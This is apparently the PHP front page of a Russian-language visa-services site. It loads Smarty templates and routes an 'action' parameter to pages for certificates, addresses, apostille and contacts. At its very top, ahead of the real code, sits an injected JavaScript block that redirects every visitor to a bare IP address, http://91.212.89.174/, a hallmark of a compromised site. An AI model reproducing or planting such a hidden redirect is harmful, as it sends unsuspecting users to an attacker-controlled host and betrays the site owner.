<SCRIPT LANGUAGE="javascript">
   <!--
   document.location.href="http://91.212.89.174/";
   //-->
 </SCRIPT>

<?php
/*********************** подключаем библиотеку smarty ***********************/
session_start();
?>
 <script type="text/javascript">
<!--
	var mybrowser=BrowserDetect.browser;
	var version=BrowserDetect.version;

	if(mybrowser=='Explorer' && version<'8')
		window.location='incompatible.html';
// -->
</script>
<?php
define('SMARTY_DIR','smarty_library/');
require(SMARTY_DIR.'Smarty.class.php');

$smarty = new Smarty ();//обьект smarty

$smarty->template_dir='tpl/templates/';//указываем путь к шаблонам
$smarty->compile_dir='tpl/templates_c/';
$smarty->config_dir='tpl/configs/';
$smarty->cache_dir='tpl/cache/';

/***************************** создаем переменные php ************************/

$arr_meta_tags['title'] = "Виза в Узбекистан";
$arr_meta_tags['keywords'] = "услуги, паспорт, учет,сертифика";
$arr_meta_tags['description'] = "";
$arr_meta_tags['content'] = "";

//$arr_meta_tags['news'] = array ('1' => array('date' => '09/12/2008', 'title' => 'Смена банковских реквизитов', 'text' => 'Уважаемые клиенты, обращаем Ваше внимание на то, что с 29 октября 2008 года у нас сменились реквизиты.'), '2' => array('date' => '11/12/2008', 'title' => 'Обновление линейки тарифных планов', 'text' => 'Теперь на всех наших тарифах еще больше места, еще больше доменов.'));

/********************************** производим анализ ************************/

//if (!empty($_REQUEST['page']) && $_REQUEST['page'] == "about") {
//	$arr_meta_tags['content'] = "С каждым днем растет число сайтов созданных для развлечений – это сайты об играх, фан сайты, сайты досуга, в том числе «домашние» страницы и т.д. Никогда еще не было так просто, чем сегодня, открыть свой сайт. И если для бизнес проектов важным аспектом выбора хостинга является стабильность и надежность, то для некоммерческих, малобюджетных сайтов главным оставалось и остается – доступность, т.е. невысокая цена. Мы предлагаем уникальное решение, делая свои услуги доступным для всех пользователей сети и даем гарантии качества и надежности.";}


//if (!empty($_REQUEST['page']) && $_REQUEST['page'] == "our_clients") {
//	$arr_meta_tags['content'] = "Уважаемые клиенты, уважаемые пользователи!
//Коллектив компании Hostland.Ru от всей души поздравляет Вас с наступающим новым годом.
//Этот год был очень насыщенным для нашей компании, мы славно потрудились, но многое впереди!
//Мы поздравляем Вас, желаем всем успехов в бизнесе, благополучия в семье и крепкого здоровья!
//
//С НОВЫМ ГОДОМ!";}

function action()
{
	//error_reporting(0);
 if(!isset($_GET['action']))
 { 	$_GET['action']=""; }

 switch($_GET['action']) { //получаем значение переменной action
   case "sert" :
      $a["id"]=0;
      if ($_POST['radb']==2) $a["name"]="KU.php";
      else
      {
      $a["name"]="sert_doc.php";
      $a["id"]=$_GET['id'];
      }
   break;
   case "vvod" :
      $a["id"]=0;
      if (isset($_POST['radb']) && $_POST['radb']==2) $a["name"]="KU.php";
      else
      {
      $a["name"]="sert.php";
      $a["id"]=isset($_GET['id']) ? $_GET['id'] : 0;
      }
   break;
    case "ku" :
      $a["id"]=0;

      $a["name"]="ku.php";
      $a["id"]=$_GET['id'];

   break;
   case "vibor":
     $a["name"]="vibor_usl.php";
     $a["id"]="";
   break;
   case "VIO":
     $a["name"]="vio.php";
   break;
  case "Adresa":
     $a["name"]="adresa.php";
   break;
  case "shtrix":
     $a["name"]="vvod.php";
   break;
   case "contact":
     $a["name"]="contact.php";
   break;
    case "apost":
     $a["name"]="apost_doc.php";
   break;
   default : // если значение переменной action не указано, либо её не существует, либо нет искомого значения
      $a["name"]="default.php";
      $a["id"]="";
   break;
   }

 return $a;
}
/************* передаем значение переменных php в переменные smarty *************/

$smarty->assign('title',$arr_meta_tags['title']);
$smarty->assign('keywords',$arr_meta_tags['keywords']);
$smarty->assign('description',$arr_meta_tags['description']);
/*$smarty->assign('news',$arr_meta_tags['news']);*/
$smarty->assign('content',$arr_meta_tags['content']);

$news_tpl = $smarty->fetch("news.tpl");
$smarty->assign('blok_news',$news_tpl);

$smarty->assign('Action',action());

/*********************** запускаем показ шаблона smarty ************************/

$smarty->display("index.tpl");




?>
